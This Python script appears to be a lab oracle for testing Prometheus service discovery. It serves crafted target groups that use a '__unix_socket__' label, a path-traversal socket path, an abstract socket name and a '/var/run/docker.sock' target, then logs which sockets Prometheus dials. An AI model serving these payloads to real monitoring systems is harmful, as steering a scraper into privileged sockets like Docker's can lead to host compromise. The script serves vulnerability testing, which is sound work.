#!/usr/bin/env python3
"""HTTP SD plus unix-socket scrape oracle for Prometheus __unix_socket__ leftover."""

from __future__ import annotations

import json
import os
import socket
import socketserver
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

ABSTRACT_LABEL = os.environ.get("ABSTRACT_NAME", "@prom-lab-oracle")
HITS_PATH = Path(os.environ.get("HITS_PATH", "/hits/hits.jsonl"))
SD_HOST = os.environ.get("SD_HOST", "127.0.0.1")
SD_PORT = int(os.environ.get("SD_PORT", "8080"))
SOCKET_PATH = Path(os.environ.get("SOCKET_PATH", "/sockets/oracle.sock"))
TRAVERSAL_PATH = os.environ.get("TRAVERSAL_PATH", "/sockets/jail/../oracle.sock")
WITNESS = os.environ.get("WITNESS", "PROMETHEUS-UNIX-SOCKET-DIAL-WITNESS")

_hits_lock = threading.Lock()


def log(msg: str) -> None:
    print(msg, flush=True)


def abstract_bind_name(label: str) -> str:
    if label.startswith("@"):
        return "\0" + label[1:]
    if label.startswith("\0"):
        return label
    return "\0" + label


def record_hit(kind: str, path: str, user_agent: str) -> None:
    row = {
        "kind": kind,
        "path": path,
        "user_agent": user_agent,
        "witness": WITNESS,
    }
    HITS_PATH.parent.mkdir(parents=True, exist_ok=True)
    line = json.dumps(row, separators=(",", ":")) + "\n"
    with _hits_lock:
        with HITS_PATH.open("a", encoding="utf-8") as handle:
            handle.write(line)


def metrics_body(kind: str) -> bytes:
    text = (
        "# HELP lab_witness unix socket scrape leftover\n"
        "# TYPE lab_witness gauge\n"
        f'lab_witness{{kind="{kind}",witness="{WITNESS}"}} 1\n'
    )
    return text.encode("utf-8")


def sd_payload() -> bytes:
    groups = [
        {
            "targets": ["localhost:1"],
            "labels": {
                "__unix_socket__": TRAVERSAL_PATH,
                "__metrics_path__": "/fs-traversal",
                "__scheme__": "http",
                "kind": "fs-traversal",
            },
        },
        {
            "targets": ["localhost:1"],
            "labels": {
                "__unix_socket__": ABSTRACT_LABEL,
                "__metrics_path__": "/abstract",
                "__scheme__": "http",
                "kind": "abstract",
            },
        },
        {
            "targets": ["unix:///var/run/docker.sock"],
            "labels": {
                "kind": "tcp-slash",
            },
        },
    ]
    return json.dumps(groups).encode("utf-8")


class OracleHandler(BaseHTTPRequestHandler):
    oracle_kind = "unknown"

    def log_message(self, fmt: str, *args: object) -> None:
        log(f"oracle-{self.oracle_kind} " + (fmt % args))

    def address_string(self) -> str:
        return self.oracle_kind

    def do_GET(self) -> None:
        record_hit(self.oracle_kind, self.path, self.headers.get("User-Agent", ""))
        body = metrics_body(self.oracle_kind)
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; version=0.0.4; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("X-Lab-Witness", WITNESS)
        self.end_headers()
        self.wfile.write(body)


class FilesystemHandler(OracleHandler):
    oracle_kind = "fs-traversal"


class AbstractHandler(OracleHandler):
    oracle_kind = "abstract"


class UnixHTTPServer(socketserver.ThreadingMixIn, socketserver.UnixStreamServer):
    daemon_threads = True
    allow_reuse_address = False

    def server_bind(self) -> None:
        path = self.server_address
        if isinstance(path, str) and not path.startswith("\0"):
            try:
                os.unlink(path)
            except FileNotFoundError:
                pass
        super().server_bind()
        if isinstance(path, str) and not path.startswith("\0"):
            os.chmod(path, 0o666)


class SDHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt: str, *args: object) -> None:
        log("sd " + (fmt % args))

    def do_GET(self) -> None:
        if self.path.split("?", 1)[0] == "/health":
            body = b"ok\n"
            content_type = "text/plain; charset=utf-8"
        elif self.path.split("?", 1)[0] == "/targets.json":
            body = sd_payload()
            content_type = "application/json"
        elif self.path.split("?", 1)[0] == "/hits.jsonl":
            if HITS_PATH.is_file():
                body = HITS_PATH.read_bytes()
            else:
                body = b""
            content_type = "application/jsonl"
        else:
            self.send_error(404)
            return
        self.send_response(200)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


def start_unix(addr: str, handler: type[BaseHTTPRequestHandler]) -> UnixHTTPServer:
    server = UnixHTTPServer(addr, handler)
    thread = threading.Thread(target=server.serve_forever, name=f"unix-{handler.oracle_kind}", daemon=True)
    thread.start()
    return server


def main() -> int:
    SOCKET_PATH.parent.mkdir(parents=True, exist_ok=True)
    (SOCKET_PATH.parent / "jail").mkdir(parents=True, exist_ok=True)
    HITS_PATH.parent.mkdir(parents=True, exist_ok=True)
    if HITS_PATH.exists():
        HITS_PATH.unlink()

    fs_server = start_unix(str(SOCKET_PATH), FilesystemHandler)
    log(f"filesystem-socket {SOCKET_PATH}")

    abs_name = abstract_bind_name(ABSTRACT_LABEL)
    abs_server = start_unix(abs_name, AbstractHandler)
    log(f"abstract-socket {ABSTRACT_LABEL}")

    sd = ThreadingHTTPServer((SD_HOST, SD_PORT), SDHandler)
    log(f"http-sd {SD_HOST}:{SD_PORT}")
    try:
        sd.serve_forever()
    finally:
        sd.shutdown()
        fs_server.shutdown()
        abs_server.shutdown()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
